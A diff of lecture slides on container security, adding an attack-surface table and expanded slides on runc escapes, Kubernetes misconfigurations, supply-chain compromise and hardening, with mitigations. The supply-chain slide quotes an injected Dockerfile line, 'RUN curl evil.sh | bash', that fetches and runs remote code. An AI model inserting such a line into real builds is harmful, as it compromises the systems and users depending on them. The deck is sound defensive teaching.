@@ -949,6 +949,26 @@ Since containers share a kernel with the host, running Linux containers directly
 
 ---
 
+<!-- _class: xsmall -->
+
+# Attack Surface Overview
+
+Containers introduce multiple layers where security can fail:
+
+| Attack Layer | Examples | Risk Level |
+|---|---|---|
+| **Network** | Exposed ports, missing network policies, unencrypted traffic | High |
+| **Host** | Misconfigured Docker daemon, unpatched kernel, weak file perms | Critical |
+| **Container Runtime** | `--privileged`, excessive capabilities, Docker socket mount | Critical |
+| **Images** | Vulnerable base images, embedded secrets, unverified registries | High |
+| **Orchestration** | Open Kubernetes API, permissive RBAC, no network policies | High |
+| **Supply Chain** | Compromised CI/CD, tampered base images, dependency confusion | Medium-High |
+| **Application** | RCE vulnerabilities, SSRF, code injection | High |
+
+A single misconfiguration at **any** layer can cascade into full host compromise. Defense in depth means hardening **every** layer.
+
+---
+
 # Attack via Network
 
 **Attack Vector:** Malicious Network Traffic -- Containers may be exposed to untrusted networks unintentionally.
@@ -988,43 +1008,91 @@ Keep the host OS and kernel up to date. Use security modules like SELinux/AppArm
 
 ---
 
+<!-- _class: small -->
+
 # Attack via Host Application Vulnerabilities
 
 **Attack Vector:** Unpatched Host Application Vulnerabilities
 
-**Description:** Exploiting vulnerabilities in host applications to gain access to the container environment.
+**Examples:**
+- **CVE-2019-5736** (runc): A malicious container could overwrite the host `runc` binary during `docker exec`, gaining root on the host
+- **CVE-2024-21626** (Leaky Vessels): runc process leak allowed container escape via `/proc/self/fd/` to access host filesystem
+- Outdated Docker daemon versions with known privilege escalation bugs
 
-**Example:** Targeting older versions of Docker with vulnerabilities to gain root privileges on worker nodes.
+**Mitigation:**
+- Keep Docker Engine, containerd, and runc updated
+- Subscribe to security advisories (Docker, NIST NVD)
+- Use container-optimized OS distributions (Bottlerocket, Flatcar) that auto-update
 
 ---
+
+<!-- _class: small -->
 
 # Attack via Container Orchestration Vulnerabilities
 
 **Attack Vector:** Misconfigured Container Orchestration
 
-**Description:** Exploiting misconfigurations in the container orchestration system to gain access to the container environment.
+**Examples:**
+- Kubernetes API server exposed without authentication → attacker creates privileged pods
+- Overly permissive RBAC: `cluster-admin` role bound to default service accounts
+- Etcd (K8s datastore) exposed without TLS → secrets readable in plaintext
+- Missing `NetworkPolicy` → any pod can talk to any other pod
 
-**Example:** Taking advantage of insecure access control policies in Kubernetes clusters to access pods and services.
+```bash
+# Check for anonymous access to K8s API
+curl -k https://<k8s-api>:6443/api/v1/pods
+```
+
+**Mitigation:**
+- Enable RBAC with least-privilege roles. Never grant `cluster-admin` by default
+- Use NetworkPolicies to restrict pod-to-pod traffic
+- Enable audit logging and mutual TLS on all components
 
 ---
+
+<!-- _class: small -->
 
 # Attack via Compromised Container Images
 
-**Attack Vector:** Attacker Gains Access to Container Image Build Process
+**Attack Vector:** Supply Chain Compromise
 
-**Description:** Compromising the container image build process to inject malicious code into container images.
+**Examples:**
+- Pulling `FROM` an unverified public image that contains a cryptominer or backdoor
+- Typosquatting: `pythonn:3.11` (extra n) instead of `python:3.11`
+- CI/CD pipeline compromised → attacker injects `RUN curl evil.sh | bash` into Dockerfiles
+- Base image updated upstream with a vulnerability → all downstream images affected
 
-**Example:** Exploiting vulnerabilities in CI/CD pipelines to inject malicious code during the container image build process.
+**Mitigation:**
+- Use **Docker Content Trust** (`DOCKER_CONTENT_TRUST=1`) to verify image signatures
+- Pin images by **digest** not just tag: `python@sha256:abc123...`
+- Scan images in CI/CD with Trivy/Grype **before** deployment
+- Use private registries with access control and vulnerability scanning
 
 ---
 
+<!-- _class: small -->
+
 # Attack via Container Vulnerabilities and Misconfigs
 
-**Attack Vector:** Unpatched Container Vulnerabilities
+**Attack Vector:** Exploiting Vulnerable or Misconfigured Containers
 
-**Description:** Exploiting vulnerabilities in the container itself to gain access to the container environment.
+**Examples:**
+- Running as root inside the container → easier to exploit kernel vulnerabilities
+- Using an old base image with known CVEs (e.g., `debian:stretch` with hundreds of CVEs)
+- Hardcoded credentials in environment variables or baked into image layers
+- Writable root filesystem → attacker can modify binaries, install tools
 
-**Example:** Targeting unpatched vulnerabilities in popular applications running within containers to gain access.
+```bash
+# Check if container runs as root
+docker exec <container> id
+# uid=0(root) gid=0(root)  ← BAD
+```
+
+**Mitigation:**
+- Always use `USER nonroot` in Dockerfiles
+- Use `--read-only` filesystem with `tmpfs` for temp directories
+- Scan images regularly and rebuild with updated base images
+- Never hardcode secrets — use Docker secrets or external vaults
 
 ---
 
